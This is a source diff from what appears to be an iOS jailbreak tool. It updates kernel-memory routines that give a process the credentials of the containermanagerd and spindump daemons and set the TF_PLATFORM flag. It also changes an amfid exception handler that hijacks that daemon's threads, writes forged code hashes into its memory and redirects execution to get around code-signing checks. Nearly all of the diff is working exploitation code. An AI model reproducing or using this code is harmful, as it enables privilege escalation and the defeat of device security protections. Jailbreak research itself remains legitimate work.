@@ -215,10 +215,10 @@ int get_hash(const CodeDirectory* directory, uint8_t dst[CS_CDHASH_LEN]) {
     return 0;
 }
 
-uint32_t OFFSET_bsd_info_pid = 0x68; // +0x68:  bsd_info->pid
 uint32_t OFFSET_bsd_info_task = 0x10; // +0x10:  bsd_info->task
 uint32_t OFFSET_task_itk_task_access = 0x2F8; // +0x2F8:  task->itk_task_access (ios13.x)
 uint32_t OFFSET_task_t_flags; // for TF_PLATFORM Patch
+uint32_t OFFSET_bsd_info_p_ucred = 0xf8;//KSTRUCT_OFFSET_PROC_UCRED
 uint32_t tfp0_port = 0;
 
 void patch_install_tfp0(uint64_t target_task, uint64_t safe_tfp0){
@@ -238,12 +238,13 @@ mach_port_t patch_retrieve_tfp0(){
 
 void patch_TF_PLATFORM(kptr_t task)
 {
-    uint32_t t_flags = ReadKernel32(task + off_t_flags);//koffset(KSTRUCT_OFFSET_TASK_TFLAGS));//OFFSET(task, t_flags));
+    uint32_t t_flags = ReadKernel32(task + koffset(KSTRUCT_OFFSET_TASK_TFLAGS));
+    //off_t_flags);//koffset(KSTRUCT_OFFSET_TASK_TFLAGS));
     util_info("old t_flags %#x", t_flags);
 
     t_flags |= 0x00000400; // TF_PLATFORM
-    WriteKernel32(task + off_t_flags, t_flags);
-    t_flags = ReadKernel32(task + off_t_flags);
+    WriteKernel32(task + koffset(KSTRUCT_OFFSET_TASK_TFLAGS), t_flags);
+    t_flags = ReadKernel32(task + koffset(KSTRUCT_OFFSET_TASK_TFLAGS));
     util_info("new t_flags %#x", t_flags);
     patch_install_tfp0(task, tfp0_exportedBYTW);
     // used in kernel func: csproc_get_platform_binary
@@ -255,7 +256,6 @@ pid_t spindump_pid = 0;
 uint64_t spindump_proc_cred = 0;
 uint64_t myold_cred2 = 0;
 uint64_t myold_cred3 = 0;
-uint32_t OFFSET_bsd_info_p_ucred = 0xf8;
 pid_t containermanagerd_pid = 0;
 uint64_t containermanagerd_proc_cred = 0;
 
@@ -269,21 +269,21 @@ void safepatch_swap_containermanagerd_cred(uint64_t target_proc){
         }
         uint64_t containermanagerd_proc = get_proc_struct_for_pid(containermanagerd_pid);
         util_info("containermanagerd_proc: 0x%llx\n",containermanagerd_proc);
-        containermanagerd_proc_cred = ReadKernel64(containermanagerd_proc + OFFSET_bsd_info_p_ucred);
+        containermanagerd_proc_cred = ReadKernel64(containermanagerd_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
         util_info("containermanagerd_proc_cred: 0x%llx\n", containermanagerd_proc_cred);
-        uint64_t target_task = ReadKernel64(target_proc + OFFSET_bsd_info_task);
+        uint64_t target_task = ReadKernel64(target_proc + koffset(KSTRUCT_OFFSET_PROC_TASK));// OFFSET_bsd_info_task);
         util_info("target_task: 0x%llx\n", target_task);
         patch_TF_PLATFORM(target_task);
         // this is a must-patch in order to get task-mani api to work
     }
     
-    myold_cred3 = ReadKernel64(target_proc + OFFSET_bsd_info_p_ucred);
+    myold_cred3 = ReadKernel64(target_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
     util_info("myold_cred3: 0x%llx\n", myold_cred3);
-    WriteKernel64(target_proc + OFFSET_bsd_info_p_ucred, containermanagerd_proc_cred);
+    WriteKernel64(target_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), containermanagerd_proc_cred);
 }
 
 void safepatch_unswap_containermanagerd_cred(uint64_t target_proc){
-    WriteKernel64(target_proc + OFFSET_bsd_info_p_ucred, myold_cred3);
+    WriteKernel64(target_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), myold_cred3);
 }
 
 void safepatch_swap_spindump_cred(uint64_t target_proc){
@@ -315,17 +315,17 @@ void safepatch_swap_spindump_cred(uint64_t target_proc){
         kill(spindump_pid, SIGSTOP);
         uint64_t spindump_proc = get_proc_struct_for_pid(spindump_pid);
          util_info("spindump_proc: 0x%llx", spindump_proc);
-        spindump_proc_cred = ReadKernel64(spindump_proc + OFFSET_bsd_info_p_ucred);
+        spindump_proc_cred = ReadKernel64(spindump_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
          util_info("spindump_proc_cred: 0x%llx", spindump_proc_cred);
-        uint64_t target_task = ReadKernel64(target_proc + OFFSET_bsd_info_task);
+         uint64_t target_task = ReadKernel64(target_proc + koffset(KSTRUCT_OFFSET_PROC_TASK));//OFFSET_bsd_info_task);
          util_info("target_task: 0x%llx", target_task);
         patch_TF_PLATFORM(target_task);
         // this is a must-patch in order to get task-mani api to work
     }
     
-    myold_cred2 = ReadKernel64(target_proc + OFFSET_bsd_info_p_ucred);
+    myold_cred2 = ReadKernel64(target_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
     util_info("myold_cred2: 0x%llx", myold_cred2);
-    WriteKernel64(target_proc + OFFSET_bsd_info_p_ucred, spindump_proc_cred);
+    WriteKernel64(target_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), spindump_proc_cred);
     has_entitlements = true;
 
 }
@@ -340,7 +340,7 @@ void safepatch_unswap_spindump_cred(uint64_t target_proc){
         spindump_proc_cred = 0;
     }
     
-    WriteKernel64(target_proc + OFFSET_bsd_info_p_ucred, myold_cred2);
+    WriteKernel64(target_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), myold_cred2);
 }
 
 
@@ -793,7 +793,7 @@ void* AMFIDExceptionHandler(void* arg) {
                 printf("[amfid][-] Error receiving exception port: %s\n", mach_error_string(ret));
                 continue;
             } else {
-                printf("[amfid][+] Got called!\n");
+               // printf("[amfid][+] Got called!\n");
                 exception_raise_request* req = (exception_raise_request*)msg;
                 
                 mach_port_t thread_port = req->thread.name;
@@ -809,7 +809,7 @@ void* AMFIDExceptionHandler(void* arg) {
                     continue;
                 }
                 
-                printf("[amfid][+] Got thread state!\n");
+                //printf("[amfid][+] Got thread state!\n");
                 
                 //create a copy of the thread state
                 _STRUCT_ARM_THREAD_STATE64 new_state;
@@ -839,7 +839,7 @@ void* AMFIDExceptionHandler(void* arg) {
                 uint8_t *orig_cdhash = (uint8_t*)amfidRead(new_state.__x[23], CS_CDHASH_LEN);
                 
                 printf("[amfid][+] Got request for: %s\n", filename);
-                printf("[amfid][*] Original cdhash: %s \n\t", orig_cdhash);
+                //printf("[amfid][*] Original cdhash: %s \n\t", orig_cdhash);
                 for (int i = 0; i < CS_CDHASH_LEN; i++) {
                     printf("%02x ", orig_cdhash[i]);
                 }
@@ -848,7 +848,7 @@ void* AMFIDExceptionHandler(void* arg) {
                 if (strlen((char*)orig_cdhash)) {
                     // legit binary
                     // jump to old MIVSACI
-                    printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
+                   // printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
                     new_state.__pc = origAMFID_MISVSACI;
                 } else {
                     uint8_t* code_directory = getCodeDirectory_amfi(filename);
@@ -950,7 +950,7 @@ void* AMFIDExceptionHandler(void* arg) {
                 printf("[amfid][-] Error receiving exception port: %s\n", mach_error_string(ret));
                 continue;
             } else {
-                printf("[amfid][+] Got called!\n");
+               // printf("[amfid][+] Got called!\n");
                 exception_raise_request* req = (exception_raise_request*)msg;
                 
                 mach_port_t thread_port = req->thread.name;
@@ -966,7 +966,7 @@ void* AMFIDExceptionHandler(void* arg) {
                     continue;
                 }
                 
-                printf("[amfid][+] Got thread state!\n");
+                //printf("[amfid][+] Got thread state!\n");
                 
                 //create a copy of the thread state
                 _STRUCT_ARM_THREAD_STATE64 new_state;
@@ -996,7 +996,7 @@ void* AMFIDExceptionHandler(void* arg) {
                 uint8_t *orig_cdhash = (uint8_t*)amfidRead(new_state.__x[23], CS_CDHASH_LEN);
                 
                 printf("[amfid][+] Got request for: %s\n", filename);
-                printf("[amfid][*] Original cdhash: %s \n\t", orig_cdhash);
+                //printf("[amfid][*] Original cdhash: %s \n\t", orig_cdhash);
                 for (int i = 0; i < CS_CDHASH_LEN; i++) {
                     printf("%02x ", orig_cdhash[i]);
                 }
@@ -1005,7 +1005,7 @@ void* AMFIDExceptionHandler(void* arg) {
                 if (strlen((char*)orig_cdhash)) {
                     // legit binary
                     // jump to old MIVSACI
-                    printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
+                    //printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
                     new_state.__pc = origAMFID_MISVSACI;
                 } else {
                     uint8_t* code_directory = getCodeDirectory_amfi(filename);
@@ -1106,137 +1106,136 @@ void* AMFIDExceptionHandler(void* arg) {
                     printf("[amfid][-] Error receiving exception port: %s\n", mach_error_string(ret));
                     continue;
                 } else {
-                    printf("[amfid][+] Got called!\n");
-                    exception_raise_request* req = (exception_raise_request*)msg;
-                    
-                    mach_port_t thread_port = req->thread.name;
-                    mach_port_t task_port = req->task.name;
-                    
-                    // we need to get some info from amfid's thread state
-                    _STRUCT_ARM_THREAD_STATE64 old_state = {0};
-                    mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
-                    
-                    ret = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
-                    if (ret != KERN_SUCCESS){
-                        printf("[amfid][-] Error getting thread state: %s\n", mach_error_string(ret));
-                        continue;
-                    }
-                    
-                    printf("[amfid][+] Got thread state!\n");
-                    
-                    //create a copy of the thread state
-                    _STRUCT_ARM_THREAD_STATE64 new_state;
-                    memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
-                    
-                    char* filename = (char*)amfidRead(new_state.__x[23], 1024);//ios
-//                    char* filename = (char*)amfidRead(new_state.__x[25], 1024);//ios
-                    if(!filename) {
-                        printf("[amfid][-] No file name?");
-                        continue;
-                    }
-                    
-                    uint8_t *orig_cdhash = (uint8_t*)amfidRead(new_state.__x[23], CS_CDHASH_LEN);
-                    
-                    printf("[amfid][+] Got request for: %s\n", filename);
-                    printf("[amfid][*] Original cdhash: %s \n\t", orig_cdhash);
-                    for (int i = 0; i < CS_CDHASH_LEN; i++) {
-                        printf("%02x ", orig_cdhash[i]);
-                    }
-                    printf("\n");
-                    
-                    if (strlen((char*)orig_cdhash)) {
-                        // legit binary
-                        // jump to old MIVSACI
-                        printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
-                        new_state.__pc = origAMFID_MISVSACI;
+                   // printf("[amfid][+] Got called!\n");
+                    if (/* iOS 12 lower */ kCFCoreFoundationVersionNumber < 1556.00){
+                        exception_raise_request* req = (exception_raise_request*)msg;
+                        mach_port_t thread_port = req->thread.name;
+                        mach_port_t task_port = req->task.name; // we need to get some info from amfid's thread state
+                        _STRUCT_ARM_THREAD_STATE64 old_state = {0};
+                        mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
+                        ret = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
+                        if (ret != KERN_SUCCESS){ printf("[amfid][-] Error getting thread state: %s\n", mach_error_string(ret)); continue; }
+                        //printf("[amfid][+] Got thread state!\n"); //create a copy of the thread state
+                        _STRUCT_ARM_THREAD_STATE64 new_state;
+                        memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
+                        char* filename = (char*)amfidRead(new_state.__x[25], 1024);//ios // try 26
+                        //                    char* filename = (char*)amfidRead(new_state.__x[25], 1024);//ios
+                        if(!filename) { printf("[amfid][-] No file name?"); continue; }
+                        uint8_t *orig_cdhash = (uint8_t*)amfidRead(new_state.__x[25], CS_CDHASH_LEN);
+                        printf("[amfid][+] Got request for: %s\n[amfid][*] Original cdhash: %s\n", filename, orig_cdhash);
+                        for (int i = 0; i < CS_CDHASH_LEN; i++) { printf("%02x ", orig_cdhash[i]); } printf("\n");
+                        if (strlen((char*)orig_cdhash)) {// legit binary// jump to old MIVSACI
+                            printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
+                            new_state.__pc = origAMFID_MISVSACI; }
+                        else {
+                            uint8_t* code_directory = getCodeDirectory_amfi(filename);
+                            if (!code_directory) { printf("[amfid][-] Can't get code directory\n");goto end124; }
+                            uint8_t cd_hash[CS_CDHASH_LEN];
+                            if (parse_superblob(code_directory, cd_hash)) { printf("[amfid][-] parse_superblob failed\n"); goto end124; }//debug
+                            printf("[amfid][*] New cdhash: \n\t");
+                            for (int i = 0; i < CS_CDHASH_LEN; i++) { printf("%02x ", cd_hash[i]); } printf("\n");
+                            new_state.__pc = origAMFID_MISVSACI;
+                            ret = mach_vm_write(task_port, old_state.__x[23], (vm_offset_t)&cd_hash, 20);
+                            if (ret == KERN_SUCCESS) { printf("[amfid][+] Wrote the cdhash into amfid\n"); }
+                            else { printf("[amfid][-] Unable to write the cdhash into amfid!\n"); } // write a 1 to [x19]
+                            amfidWrite32(old_state.__x[19], 1);
+                            new_state.__pc = loadAddr(task_port) + I6S_14_3_AMFID_RET;//(old_state.__lr & 0xfffffffffffff000) + 0x1000; // 0x2dacwhere to continue
+                            printf("[amfid][i] Old PC: 0x%llx, new PC: 0x%llx\n", old_state.__pc, new_state.__pc);
+                        } // set the new thread state:
+                        ret = thread_set_state(thread_port, 6, (thread_state_t)&new_state, sizeof(new_state)/4);
+                        if (ret != KERN_SUCCESS) { printf("[amfid][-] Failed to set new thread state %s\n", mach_error_string(ret)); } else { printf("[amfid][+] Success setting new state for amfid!\n");}
+                        exception_raise_reply reply = {0};
+                        reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
+                        reply.Head.msgh_size = sizeof(reply);
+                        reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
+                        reply.Head.msgh_local_port = MACH_PORT_NULL;
+                        reply.Head.msgh_id = req->Head.msgh_id + 0x64;
+                        reply.NDR = req->NDR;
+                        reply.RetCode = KERN_SUCCESS;
+                        ret = mach_msg(&reply.Head,
+                                       1,
+                                       (mach_msg_size_t)sizeof(reply),
+                                       0,
+                                       MACH_PORT_NULL,
+                                       MACH_MSG_TIMEOUT_NONE,
+                                       MACH_PORT_NULL);
+                        mach_port_deallocate(mach_task_self(), thread_port);
+                        mach_port_deallocate(mach_task_self(), task_port);
+                        if (ret != KERN_SUCCESS){ printf("[amfid][-] Failed to send the reply to the exception message %s\n", mach_error_string(ret)); } else { printf("[amfid][+] Replied to the amfid exception...\n");}
+                        if(strcmp(filename, "/freya/amfidebilitate64") == 0) {
+                            printf("Found amfidebilitate, no longer need to run this function.");
+                            amfidWrite64(patchAddr, origAMFID_MISVSACI);free(filename); free(orig_cdhash);
+                            resetEntitlements(get_proc_struct_for_pid(getpid())); break; }
+                    end124:;
+                        free(filename);
+                        free(orig_cdhash);
                     } else {
-                        uint8_t* code_directory = getCodeDirectory_amfi(filename);
-                        if (!code_directory) {
-                            printf("[amfid][-] Can't get code directory\n");
-                            goto end124;
-                        }
-                        uint8_t cd_hash[CS_CDHASH_LEN];
-                        if (parse_superblob(code_directory, cd_hash)) {
-                            printf("[amfid][-] parse_superblob failed\n");
-                            goto end124;
-                        }
-                        
-                        //debug
-                        printf("[amfid][*] New cdhash: \n\t");
-                        for (int i = 0; i < CS_CDHASH_LEN; i++) {
-                            printf("%02x ", cd_hash[i]);
-                        }
-                        printf("\n");
-                        
-                        new_state.__pc = origAMFID_MISVSACI;
-                        
-                        ret = mach_vm_write(task_port, old_state.__x[23], (vm_offset_t)&cd_hash, 20);
-                        if (ret == KERN_SUCCESS)
-                        {
-                            printf("[amfid][+] Wrote the cdhash into amfid\n");
+                        exception_raise_request* req = (exception_raise_request*)msg;
+                        mach_port_t thread_port = req->thread.name;
+                        mach_port_t task_port = req->task.name;// we need to get some info from amfid's thread state
+                        _STRUCT_ARM_THREAD_STATE64 old_state = {0};
+                        mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
+                        ret = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
+                        if (ret != KERN_SUCCESS){ printf("[amfid][-] Error getting thread state: %s\n", mach_error_string(ret)); continue; } //printf("[amfid][+] Got thread state!\n");//create a copy of the thread state
+                        _STRUCT_ARM_THREAD_STATE64 new_state;
+                        memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
+                        char* filename = (char*)amfidRead(new_state.__x[23], 1024);//ios // try 26
+                        if(!filename) { printf("[amfid][-] No file name?"); continue; }
+                        uint8_t *orig_cdhash = (uint8_t*)amfidRead(new_state.__x[23], CS_CDHASH_LEN);
+                        printf("[amfid][+] Got request for: %s\n", filename);
+                        printf("[amfid][*] Original cdhash: %s \n\t", orig_cdhash);
+                        for (int i = 0; i < CS_CDHASH_LEN; i++) { printf("%02x ", orig_cdhash[i]); } printf("\n");
+                        if (strlen((char*)orig_cdhash)) {// legit binary // jump to old MIVSACI
+                            printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
+                            new_state.__pc = origAMFID_MISVSACI;
                         } else {
-                            printf("[amfid][-] Unable to write the cdhash into amfid!\n");
-                        }
-                        
-                        // write a 1 to [x19]
-                        amfidWrite32(old_state.__x[26], 1);
-                        new_state.__pc = loadAddr(task_port) + I6S_14_3_AMFID_RET;//(old_state.__lr & 0xfffffffffffff000) + 0x1000; // 0x2dacwhere to continue
-                        
-                        printf("[amfid][i] Old PC: 0x%llx, new PC: 0x%llx\n", old_state.__pc, new_state.__pc);
+                            uint8_t* code_directory = getCodeDirectory_amfi(filename);
+                            if (!code_directory) { printf("[amfid][-] Can't get code directory\n"); goto end122; }
+                            uint8_t cd_hash[CS_CDHASH_LEN];
+                            if (parse_superblob(code_directory, cd_hash)) { printf("[amfid][-] parse_superblob failed\n"); goto end122; } //debug
+                            printf("[amfid][*] New cdhash: \n\t");
+                            for (int i = 0; i < CS_CDHASH_LEN; i++) { printf("%02x ", cd_hash[i]); } printf("\n");
+                            new_state.__pc = origAMFID_MISVSACI;
+                            ret = mach_vm_write(task_port, old_state.__x[23], (vm_offset_t)&cd_hash, 20);
+                            if (ret == KERN_SUCCESS) { printf("[amfid][+] Wrote the cdhash into amfid\n"); }
+                            else { printf("[amfid][-] Unable to write the cdhash into amfid!\n"); } // write a 1 to [x19]
+                            amfidWrite32(old_state.__x[26], 1);
+                            new_state.__pc = loadAddr(task_port) + I6S_14_3_AMFID_RET;//(old_state.__lr & 0xfffffffffffff000) + 0x1000; // 0x2dacwhere to continue
+                            printf("[amfid][i] Old PC: 0x%llx, new PC: 0x%llx\n", old_state.__pc, new_state.__pc);
+                        } // set the new thread state:
+                        ret = thread_set_state(thread_port, 6, (thread_state_t)&new_state, sizeof(new_state)/4);
+                        if (ret != KERN_SUCCESS) { printf("[amfid][-] Failed to set new thread state %s\n", mach_error_string(ret));
+                        } else { printf("[amfid][+] Success setting new state for amfid!\n"); }
+                        exception_raise_reply reply = {0};
+                        reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
+                        reply.Head.msgh_size = sizeof(reply);
+                        reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
+                        reply.Head.msgh_local_port = MACH_PORT_NULL;
+                        reply.Head.msgh_id = req->Head.msgh_id + 0x64;
+                        reply.NDR = req->NDR;
+                        reply.RetCode = KERN_SUCCESS; // MACH_SEND_MSG|MACH_MSG_OPTION_NONE == 1 ???
+                        ret = mach_msg(&reply.Head,
+                                       1,
+                                       (mach_msg_size_t)sizeof(reply),
+                                       0,
+                                       MACH_PORT_NULL,
+                                       MACH_MSG_TIMEOUT_NONE,
+                                       MACH_PORT_NULL);
+                        mach_port_deallocate(mach_task_self(), thread_port);
+                        mach_port_deallocate(mach_task_self(), task_port);
+                        if (ret != KERN_SUCCESS){
+                            printf("[amfid][-] Failed to send the reply to the exception message %s\n", mach_error_string(ret)); } else{ printf("[amfid][+] Replied to the amfid exception...\n"); }
+                        if(strcmp(filename, "/freya/amfid_bypassd") == 0) { //if(strcmp(filename, "/freya/amfidebilitate64") == 0) {
+                            printf("Found amfidebilitate, no longer need to run this function."); amfidWrite64(patchAddr, origAMFID_MISVSACI);
+                            free(filename);free(orig_cdhash); resetEntitlements(get_proc_struct_for_pid(getpid())); break; }
+                    end122:;
+                        free(filename);
+                        free(orig_cdhash);
                     }
-                    
-                    // set the new thread state:
-                    ret = thread_set_state(thread_port, 6, (thread_state_t)&new_state, sizeof(new_state)/4);
-                    if (ret != KERN_SUCCESS) {
-                        printf("[amfid][-] Failed to set new thread state %s\n", mach_error_string(ret));
-                    } else {
-                        printf("[amfid][+] Success setting new state for amfid!\n");
                     }
-                    
-                    exception_raise_reply reply = {0};
-                    
-                    reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
-                    reply.Head.msgh_size = sizeof(reply);
-                    reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
-                    reply.Head.msgh_local_port = MACH_PORT_NULL;
-                    reply.Head.msgh_id = req->Head.msgh_id + 0x64;
-                    
-                    reply.NDR = req->NDR;
-                    reply.RetCode = KERN_SUCCESS;
-                    // MACH_SEND_MSG|MACH_MSG_OPTION_NONE == 1 ???
-                    ret = mach_msg(&reply.Head,
-                                   1,
-                                   (mach_msg_size_t)sizeof(reply),
-                                   0,
-                                   MACH_PORT_NULL,
-                                   MACH_MSG_TIMEOUT_NONE,
-                                   MACH_PORT_NULL);
-                    
-                    mach_port_deallocate(mach_task_self(), thread_port);
-                    mach_port_deallocate(mach_task_self(), task_port);
-                    if (ret != KERN_SUCCESS){
-                        printf("[amfid][-] Failed to send the reply to the exception message %s\n", mach_error_string(ret));
-                    } else{
-                        printf("[amfid][+] Replied to the amfid exception...\n");
-                    }
-                    
-                    if(strcmp(filename, "/freya/amfid_bypassd") == 0) {
-                    //if(strcmp(filename, "/freya/amfidebilitate64") == 0) {
-                    printf("Found amfidebilitate, no longer need to run this function.");
-                    amfidWrite64(patchAddr, origAMFID_MISVSACI);
-                    free(filename);
-                    free(orig_cdhash);
-                    resetEntitlements(get_proc_struct_for_pid(getpid()));
-                    break;
-                }
-                    
-                end124:;
-                    free(filename);
-                    free(orig_cdhash);
                 }
             }
-        }
-        
+
     return NULL;
 }
 
@@ -1277,7 +1276,7 @@ void resetEntitlementsForRootFS(uint64_t selfProc) {
         return;
     
     has_entitlements_rootfs = false;
-    uint64_t selfCreds = ReadKernel64(selfProc + KSTRUCT_OFFSET_PROC_UCRED);
+    uint64_t selfCreds = ReadKernel64(selfProc + koffset(KSTRUCT_OFFSET_PROC_UCRED));//KSTRUCT_OFFSET_PROC_UCRED);
     
     WriteKernel64(ReadKernel64(selfCreds + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + off_amfi_slot, selfEnts);
     kill(fsck_apfs_pid, SIGKILL);
